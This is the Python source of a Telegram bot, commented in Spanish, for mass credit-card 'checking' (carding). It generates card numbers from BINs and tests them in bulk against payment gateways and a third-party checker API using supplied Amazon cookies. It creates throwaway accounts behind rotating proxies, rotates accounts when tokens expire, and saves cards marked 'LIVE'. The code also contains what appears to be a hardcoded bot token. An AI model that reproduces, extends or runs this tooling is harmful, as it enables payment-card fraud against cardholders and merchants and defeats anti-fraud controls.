#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Bot de Telegram para verificación MASIVA de tarjetas de crédito (Hasta 10)
Utiliza la API de Leviatan-Chk para validar tarjetas (Amazon Global)
"""
import subprocess
import telebot
import requests
import os
import re
import json
import time
import random
from dotenv import load_dotenv
from typing import Dict, Optional, List
from func_bin import get_bin_info
from func_gen import cc_generar
from Func import connect_to_db
from b3maxing import braintree
from gates_nomus import principal
import datetime
#from gates_nomus import mis_parametros

from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.align import Align
from rich.table import Table

from gen import cc_gen, cargar_bin_db, buscar_bin
from main import (
    cargar_proxies, cargar_tokens, cargar_combo,
    guardar_combo, guardar_live, guardar_dead,
    check_card, format_proxy, log_to_file,
    registrar_cuenta, crear_cuentas_para_check,
    MONTOS, API_NO_DISPONIBLE, TOKENS_FILE,
    procesar_tarjetas_pegadas, USED_PHONES
)

CUENTAS_FIJAS = 10
TARJETAS_POR_CUENTA_FIJO = 15
ERRORES_ROTACION = 2

# Cargar variables de entorno
load_dotenv('bot_config.env')

# Configuración
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8652995598:AAFGib3mUxVkFvxC3lJGi-z303yeHZdEb_I')
LEVIATAN_API_URL = "https://leviatan-chk.site/amazon/leviatan"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Inicializar el bot
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def validate_user(message) -> str:
    user_id = message.from_user.id
    conn = connect_to_db()
    cursor = conn.cursor() 
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE rango = "Admin" AND user_id = ?', (user_id,))
    user_data = cursor.fetchone()

    valor = "OK"
    if not user_data:
        valor = "<b>❌ First, you must register. comand -> /register .</b>"
            
    #if user_data[0] in ["Baneado", "baneado"]:
    #valor = "<b>You are not allowed to use the bot \nReason: Banned bot❌. </b> "

    return valor


def validate_card_format(card: str) -> bool:
    pattern = r'^(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$'
    return bool(re.match(pattern, card.strip()))

def check_card_api(card: str, cookies: str) -> Dict:
    """Función interna para llamar a la API para una sola tarjeta"""
    try:
        data = {"card": card.strip(), "cookies": cookies.strip()}
        headers = {"Content-Type": "application/json", "User-Agent": USER_AGENT}
        
        response = requests.post(LEVIATAN_API_URL, json=data, headers=headers, timeout=45)
        
        if response.status_code != 200:
            return {'success': False, 'error': f'Error API HTTP {response.status_code}'}
        
        result = response.json()
        if isinstance(result, list) and len(result) > 0:
            result = result[0]
            
        if 'error' in result:
            return {'success': False, 'error': result['error']}
            
        return {'success': True, 'data': result}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def format_single_result(result: Dict, index: int = None) -> str:
    """Formatea el resultado de una sola tarjeta de forma compacta"""
    prefix = f"<b>[{index}]</b> " if index is not None else ""
    
    if not result.get('success'):
        return f"{prefix}❌ Error: {result.get('error')}"
    
    data = result.get('data', {})
    status = data.get('status', 'N/A')
    msg = data.get('message', 'N/A')
    card = data.get('card', 'N/A')
    
    # Limpiar mensaje de @LeviatanChk si existe para que sea más limpio
    msg = msg.replace("@LeviatanChk", "").strip()
    
    # Emoji basado en status
    emoji = "✅" if "Approved" in status or "Aprobada" in status else "❌"
    if "Error" in status or "⚠️" in status: emoji = "⚠️"
    
    res_str = f"{prefix}{emoji} <code>{card}</code>\n"
    res_str += f"┗ <b>Resultado:</b> {msg}\n"
    
    if "bin" in data:
        res_str += f"┗ <b>Info:</b> {data.get('bin')} | {data.get('bank')} | {data.get('country')}\n"
    
    return res_str

#------COMANDO /START --------#
@bot.message_handler(commands=['start'])
def send_welcome(message):

    rango = validate_user(message)
    if rango != 'OK':
       return bot.reply_to(message, rango, parse_mode='HTML')
       

    welcome_text = """
🚀 <b>Nomus Cheker Bot - V2.0 (Masivo)</b>

¡Bienvenido! Ahora puedes verificar hasta <b>10 tarjetas</b> a la vez.
----------------------------------------------------------------------
<b>Comando: /check </b>
<code>/check TARJETA1
TARJETA2
...
TARJETA 10
COOKIES</code>

<b>Ejemplo:</b>
<code>/check 4532640527811643|12|2025|123
4111111111111111|01|2026|456
tu_cookie_de_amazon_aqui</code>

<i>El bot procesará cada una y te dará un reporte final.</i>
-----------------------------------------------------------

<b>Comando: /bin </b>
<code>/bin 4532640527811643|12|2025|20|1
/bin cc[6-12 digitos] | mes[00] | año[0000] | generar [hasta 100]</code> | monto $1 , $20 $100

<i>El bot generará y procesará y te dará un reporte final.</i>

    """
    bot.reply_to(message, welcome_text, parse_mode='HTML')


#------COMANDO /STIKER --------#
@bot.message_handler(commands=['stik'])
def send_stik(message):
   # text1 = """ holaaaaaaaaaaaaaaaa """
   # bot.reply_to(message, text1, parse_mode='HTML')
    bot.reply_to(message, """<b>[<a href='t.me/tg'>⌥</a> STIKERS OFICIALES MIKASA https://t.me/addstickers/Crh73   
     </b>""", parse_mode='HTML') 



#------COMANDO /GEN  --------#
@bot.message_handler(commands=['gen'])
def gen_handler(message):

    rango = validate_user(message)
    if rango != 'OK':
       return bot.reply_to(message, rango, parse_mode='HTML')


    user_id = message.from_user.id
    username = message.from_user.username
    #bin_lasted = message.text[len('/gen '):] 

    global input

    if message.reply_to_message:
           input = re.findall(r'[0-9x]+', message.reply_to_message.text)
    else:
            input = re.findall(r'[0-9x]+', message.text)
   
    if not input:
        bot.reply_to(message,"""_USE BIEN LA HERRAMIENTA /gen 4556747...""", parse_mode='HTML')
        return

    #-----------FUNCION GNERADOR----------#
    if len(input)==1:
        cc = input[0]
        mes = 'x'
        ano = 'x'
        cvv = 'x'
    elif len(input)==2:
        cc = input[0]
        mes = input[1][0:2]
        ano = 'x'
        cvv = 'x'
    elif len(input)==3:
        cc = input[0]
        mes = input[1][0:2]
        ano = input[2]
        cvv = 'x'
    elif len(input)==4:
        cc = input[0]
        mes = input[1][0:2]
        ano = input[2]
        cvv = input[3]
    else:
        cc = input[0]
        mes = input[1][0:2]
        ano = input[2]
        cvv = input[3]                

    if len(input[0]) < 6: return bot.reply_to(message,"""<b>Invalid Bin ⚠️</b>""", parse_mode='HTML')
    
    # valor = cc + mes + ano + cvv
    # bot.reply_to(message,valor, parse_mode='HTML')
    # cc1,cc2,cc3,cc4,cc5,cc6,cc7,cc8,cc9,cc10 = cc_gen(cc,mes,ano,cvv)

    cc1,cc2,cc3,cc4,cc5,cc6,cc7,cc8,cc9,cc10 = cc_generar(cc,mes,ano,cvv)
    

    extra = str(cc) + 'xxxxxxxxxxxxxxxxxxxxxxx'
    if mes == 'x':
        mes_2 = 'rnd'
    else:
        mes_2 = mes
    if ano == 'x':
            ano_2 = 'rnd'
    else:
        ano_2 = ano
    if cvv == 'x':
        cvv_2 = 'rnd'
    else:
        cvv_2 = cvv

    x = get_bin_info(cc[0:6])
    #--------PLANTILLA--------#

    bot.reply_to(message, cc1 + cc2 + cc3 + cc4 + cc5 + cc6 + cc7 + cc8 + cc9 +cc10 , parse_mode='HTML')


#---------------REGISTER /BRN ---------------#    
@bot.message_handler(commands=['brn'])
def valida_command(message):
    resultado = braintree("4169161471954056|12|2029|672")
    bot.reply_to(message, resultado, parse_mode='HTML')
    #parts = message.text.split(' ')
    #cards_raw = [parts[1]]
    #cookies = parts[2] 

#---------------REGISTER de GATES /GT1 o /GT2 o /GT3 ---------------#    
@bot.message_handler(commands=['gt1'] or ['gt2'] or ['gt3'])
def valida_command(message):

    gatehtml = "https://www.billiedoo.com"

    #if message == 'gt1':
    #   gatehtml = "https://www.billiedoo.com"
    #if message == 'gt2':
    #   gatehtml = "https://www.billiedoo.com"
    #if message == 'gt3':
    #   gatehtml = "https://www.billiedoo.com"

    try:
        lines = message.text.split('\n')
        print("lineas")
        print(len(lines))

        if len(lines) < 2:
            # Intentar parsear si enviaron todo en una línea (espacio como separador final para cookies)
            parts = message.text.split(' ')
            if len(parts) < 2:
                bot.reply_to(message, "❌ <b>Formato inválido.</b>\nUsa saltos de línea para las tarjetas y pon las cookies al final.", parse_mode='HTML')
                return
            cards_raw = [parts[1]]
            cookies = "" #parts[2]
        else:
            # Primera línea tiene el comando y quizás la primera tarjeta
            first_line = lines[0].replace('/gt1', '').strip()
            cards_raw = []
            if first_line: cards_raw.append(first_line)
            
            # Líneas intermedias son tarjetas, la última son cookies
            for i in range(1, len(lines) ):
                if lines[i].strip(): cards_raw.append(lines[i].strip())
            
            cookies = lines[-1].strip()

        # Filtrar tarjetas válidas y limitar a 10
        valid_cards = [c for c in cards_raw if validate_card_format(c)]
        if not valid_cards:
            bot.reply_to(message, "❌ No encontré tarjetas válidas en el formato <code>numero|mes|año|cvv</code>", parse_mode='HTML')
            return
            
        if len(valid_cards) > 10:
            bot.reply_to(message, "⚠️ Has enviado más de 10 tarjetas. Solo procesaré las primeras 10.")
            valid_cards = valid_cards[:10]

        status_msg = bot.reply_to(message, f"⏳ <b>Procesando {len(valid_cards)} tarjetas...</b>\nPor favor espera, esto puede tardar un momento.", parse_mode='HTML')
        
        final_report = f"📊 <b>Reporte de Verificación ({len(valid_cards)})</b>\n\n"
        
        print("cards")
        print(valid_cards)

        for idx, card in enumerate(valid_cards, 1):
            principal("numero:")
            print(card)

            # Actualizar mensaje de estado cada 2 tarjetas para dar feedback
            if idx > 1 and idx % 2 == 0:
                bot.edit_message_text(f"⏳ <b>Procesando {idx}/{len(valid_cards)}...</b>", message.chat.id, status_msg.message_id, parse_mode='HTML')
            
            # ***-- res = check_card_api(card, cookies)
            # res = subprocess.run(["python", "gates1.py", "gatehtml", card], capture_output=True, text=True)
            res = principal(card)
            final_report += "Tarjeta # " + str(idx) + " [" + card + "] " + res + "\n"

            #final_report += format_single_result(res, idx) + "\n"
            time.sleep(1) # Pequeño delay para no saturar la API

        print("res:")
        print(final_report)
        bot.reply_to(message, final_report, parse_mode='HTML')
        #bot.reply_to(message, f"✅ <b>APPROVED:</b> {final_report}", parse_mode='HTML')
        #bot.edit_message_text(final_report, message.chat.id, status_msg.message_id, parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error crítico:</b> {str(e)}", parse_mode='HTML')



#------------ ****NUEVO**** - REGISTER de GATE OLIMPO /bin ---------------#    
@bot.message_handler(commands=['bin'] or ['BIN'])
def valida_command(message):

    gatehtml = ""
    try:
        lines = message.text.split('\n')

        if len(lines) < 2:
            # Intentar parsear si enviaron todo en una línea (espacio como separador final para cookies)
            parts = message.text.split(' ')

            if len(parts) < 2:
                bot.reply_to(message, "❌ <b>Formato inválido.</b>\nUsa saltos de línea para las tarjetas y pon las cookies al final.", parse_mode='HTML')
                return
            cards_raw = [parts[1]]
            cookies = "" #parts[2]
        else:
            # Primera línea tiene el comando y quizás la primera tarjeta
            bot.reply_to(message, "❌ No es válido el formato <code>numero|mes|año|cantidad</code>", parse_mode='HTML')
            return

        valid_cards = cards_raw
        #----------------------------------------    
        #if len(valid_cards) > 10:
        #    bot.reply_to(message, "⚠️ Has enviado más de 10 tarjetas. Solo procesaré las primeras 10.")
        #    valid_cards = valid_cards[:10]

        #status_msg = bot.reply_to(message, f"⏳ <b>Procesando {len(valid_cards)} tarjetas...</b>\nPor favor espera, esto puede tardar un momento.", parse_mode='HTML')
        final_report = f"📊 <b>Reporte de Verificación ({len(valid_cards)})</b>\n\n"

        card = valid_cards[0]

        divisor = card.split("|")
        cc = divisor[0]
        mes = divisor[1]
        anio = divisor[2]
        num = divisor[3]
        monto = int(divisor[4])

        #cc = card[:12]
        #mes = card[13:15]
        #anio = card[16:18]
        #if anio == '20':
        #   anio = card[16:20]
        #   num = card[21:]
        #else:
        #   num = card[19:]

        if (len(cc) == 0) or (len(mes) == 0) or (len(anio) == 0) or (len(num) == 0) or monto == 0:
            bot.reply_to(message, "❌ No es válido el formato enviado <code>numero|mes|año|cantidad</code>", parse_mode='HTML')            
            return

        if (len(cc) > 12):
            bot.reply_to(message, "❌ La cc no puede tener mas de 12 digitos pendejooo !!! <code> cc = maximo 12 digitos </code>", parse_mode='HTML')            
            return


        # se generarn las tarjetas del bin
        ccs = cc_gen(cc, mes, anio, int(num))
        guardar_combo(ccs)
        combos = cargar_combo()
        total_tarjetas = len(combos)

        monto_nombre = "$" + str(monto) + ".0 MX CARGO "
        #monto = 1
    
        proxies_list = cargar_proxies()
        bin_db = cargar_bin_db()

        status_msg = bot.reply_to(message, f"⏳ <b>Procesando {len(combos)} tarjetas...</b>\nPor favor espera, esto puede tardar un momento.", parse_mode='HTML')

        if os.path.exists(TOKENS_FILE):
            os.remove(TOKENS_FILE)

        USED_PHONES.clear()
        tokens_generados = crear_cuentas_para_check(CUENTAS_FIJAS, proxies_list)
    
        if tokens_generados == 0:
            logs = "  [red]No se generaron tokens. Abortando.[/red]"
            return

        tokens = cargar_tokens()
        lives_total = 0
        deads_total = 0
        errores_total = 0
        cuentas_usadas = 0
        token_expirados = 0
        api_no_disponible = False
        errores_consecutivos = 0
        #clear()

        i = 0
        token_idx = 0
        token_actual = None
        proxy_actual = None
        tarjetas_en_cuenta = 0

        while i < total_tarjetas and not api_no_disponible:
            if tarjetas_en_cuenta >= TARJETAS_POR_CUENTA_FIJO or token_actual is None:
                if token_idx >= len(tokens):
                    logs = "  [red]No hay mas tokens disponibles[/red]"
                    break
                token_actual = tokens[token_idx]
                token_idx += 1
                proxy_actual = format_proxy(random.choice(proxies_list)) if proxies_list else None
                cuentas_usadas += 1
                tarjetas_en_cuenta = 0
                errores_consecutivos = 0

            combo = combos[i]
            if not combo or "|" not in combo:
                i += 1
                continue
            parts = combo.strip().split("|")
            if len(parts) < 4:
                i += 1
                continue

            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            bin_info = buscar_bin(cc, bin_db)
            brand = bin_info.get("brand", "?")
            banco = bin_info.get("Banco", "?")

            t_num = Text()
            t_num.append(f"  [{i+1}/{total_tarjetas}] ", style="white")
            t_num.append(f"{cc[:6]}...{cc[-4:]}", style="white")
            t_num.append(" | ", style="dim")
            t_num.append(f"{brand} - {banco}", style="dim")
            #console.print(t_num)

            tipo, display, detalle = check_card(cc, mes, ano, cvv, monto, monto_nombre, token_actual, proxy_actual, bin_info)
            bot.edit_message_text(f"⏳ <b>Procesando {i}/{len(combos)}...</b>", message.chat.id, status_msg.message_id, parse_mode='HTML')

            if tipo == "token_expired":
                token_expirados += 1
                bot.reply_to(message,f"    [yellow]TOKEN EXPIRADO | Cambiando a siguiente cuenta...[/yellow]", parse_mode='HTML')
                token_actual = None
                tarjetas_en_cuenta = TARJETAS_POR_CUENTA_FIJO
                errores_consecutivos = 0
                continue

            if tipo == "error" and ("API APAGADA" in detalle or "API NO DISPONIBLE" in detalle):
                errores_consecutivos += 1
                bot.reply_to(message,f"    [yellow]ERROR API ({errores_consecutivos}/{ERRORES_ROTACION})[/yellow]", parse_mode='HTML')
                if errores_consecutivos >= ERRORES_ROTACION:
                    bot.reply_to(message,f"    [bold red]Forzando rotación de cuenta...[/bold red]", parse_mode='HTML')
                    token_actual = None
                    tarjetas_en_cuenta = TARJETAS_POR_CUENTA_FIJO
                    errores_consecutivos = 0
                    continue
                else:
                    errores_total += 1
                    bot.reply_to(message,f"    [red]ERROR | {detalle}[/red]", parse_mode='HTML')
                    tarjetas_en_cuenta += 1
                    i += 1
                    continue

            errores_consecutivos = 0

            if tipo == "live":
                lives_total += 1
                guardar_live(combo, monto_nombre, bin_info)

                res = f" ✅ <b>Status: LIVE</b>"
                final_report += "Tarjeta # " + str(i) + " [" + combo + "] " + res + "\n"
                #time.sleep(1) # Pequeño delay para no saturar la API

            elif tipo == "dead":
                deads_total += 1
                guardar_dead(combo, detalle, bin_info)
                if "HTTP" in detalle or "Fondos" not in detalle:
                    res = f" ❌ <b>DEAD</b>"
                    final_report += "Tarjeta # " + str(i) + " [" + combo + "] " + res + "\n"
                    #time.sleep(1) # Pequeño delay para no saturar la API
                else:
                    res = f" ❌ <b>DEAD | {detalle}</b>"
                    final_report += "Tarjeta # " + str(i) + " [" + combo + "] " + res + "\n"
                    #time.sleep(1) # Pequeño delay para no saturar la API

            else:
                errores_total += 1
                res = f"  ❌ <b>ERROR | {detalle}</b>"
                final_report += "Tarjeta # " + str(i) + " [" + combo + "] " + res + "\n"
                #time.sleep(1) # Pequeño delay para no saturar la API

            tarjetas_en_cuenta += 1
            i += 1

            if i < total_tarjetas:
                time.sleep(random.uniform(0.8, 1.5))

        final_report += f"\n  <b>**FINALIZADO**</b>"
        final_report += f"  ✅ <b>Lives: {lives_total}</b>"
        final_report += f"  ❌ <b>Deads: {deads_total}</b>"
        final_report +=f"   ⚠️ <b>Errores: {errores_total}</b>"
        final_report +=f"  <b>Tokens expirados: {token_expirados}</b>"
        final_report +=f"  <b>Cuentas usadas: {cuentas_usadas}</b>"

        log_to_file(f"FINALIZADO - Lives: {lives_total} | Deads: {deads_total} | Errores: {errores_total} | Tokens expirados: {token_expirados}")
        #input("\n  [Enter para volver]")

        #----------------------------------------------
        #print("resultados:")
        #print(final_report)
        bot.reply_to(message, final_report, parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error crítico:</b> {str(e)}", parse_mode='HTML')



#---------------REGISTER /REGISTER ---------------#    
@bot.message_handler(commands=['register'])
def register_command(message):
    conn = connect_to_db()
    cursor = conn.cursor()
    username = message.from_user.username
    user_id = message.from_user.id
    cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
    existing_user = cursor.fetchone()


    if existing_user:
        bot.reply_to(message, "<b>You're already registered.</b> <a href='https://i.imgur.com/uLKx1Zb.jpg'>&#8203;</a>", parse_mode='HTML')
    else:
        registration_time = datetime.datetime.now().timestamp()
        cursor.execute('INSERT INTO users (user_id, rango, creditos, antispam, dias, fecha_registro) VALUES (?, ?, ?, ?, ?, ?)', (user_id, 'Free', 0, 60, 0, registration_time))
        conn.commit()
        bot.reply_to(message, "<b>Full registration.</b> <a href='https://i.imgur.com/uLKx1Zb.jpg'>&#8203;</a>", parse_mode='HTML')

        seller_chat_id = 7770553450 # Replace with the ID of the chat where you want to send the message
        bot.reply_to(message, f"<b>Nuevo Usuario Registrado {str(user_id)} {str(username)} </b>", parse_mode='HTML')
        

#------COMANDO /CHECK --------#
@bot.message_handler(commands=['check'])
def handle_check_massive(message):

    rango = validate_user(message)
    if rango != 'OK':
       return bot.reply_to(message, rango, parse_mode='HTML')

    try:
        lines = message.text.split('\n')
        if len(lines) < 2:
            # Intentar parsear si enviaron todo en una línea (espacio como separador final para cookies)
            parts = message.text.split(' ')
            if len(parts) < 3:
                bot.reply_to(message, "❌ <b>Formato inválido.</b>\nUsa saltos de línea para las tarjetas y pon las cookies al final.", parse_mode='HTML')
                return
            cards_raw = [parts[1]]
            cookies = parts[2]
        else:
            # Primera línea tiene el comando y quizás la primera tarjeta
            first_line = lines[0].replace('/check', '').strip()
            cards_raw = []
            if first_line: cards_raw.append(first_line)
            
            # Líneas intermedias son tarjetas, la última son cookies
            for i in range(1, len(lines) - 1):
                if lines[i].strip(): cards_raw.append(lines[i].strip())
            
            cookies = lines[-1].strip()

        # Filtrar tarjetas válidas y limitar a 10
        valid_cards = [c for c in cards_raw if validate_card_format(c)]
        if not valid_cards:
            bot.reply_to(message, "❌ No encontré tarjetas válidas en el formato <code>numero|mes|año|cvv</code>", parse_mode='HTML')
            return
            
        if len(valid_cards) > 15:
            bot.reply_to(message, "⚠️ Has enviado más de 15 tarjetas. Solo procesaré las primeras 15.")
            valid_cards = valid_cards[:15]

        status_msg = bot.reply_to(message, f"⏳ <b>Procesando {len(valid_cards)} tarjetas...</b>\nPor favor espera, esto puede tardar un momento.", parse_mode='HTML')
        
        final_report = f"📊 <b>Reporte de Verificación ({len(valid_cards)})</b>\n\n"
        
        for idx, card in enumerate(valid_cards, 1):
            # Actualizar mensaje de estado cada 2 tarjetas para dar feedback
            if idx > 1 and idx % 2 == 0:
                bot.edit_message_text(f"⏳ <b>Procesando {idx}/{len(valid_cards)}...</b>", message.chat.id, status_msg.message_id, parse_mode='HTML')
            
            res = check_card_api(card, cookies)
            final_report += format_single_result(res, idx) + "\n"
            time.sleep(1) # Pequeño delay para no saturar la API

        bot.edit_message_text(final_report, message.chat.id, status_msg.message_id, parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error crítico:</b> {str(e)}", parse_mode='HTML')

def main():
    print("-- Bot Masivo Iniciado...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)

if __name__ == '__main__':
    main()
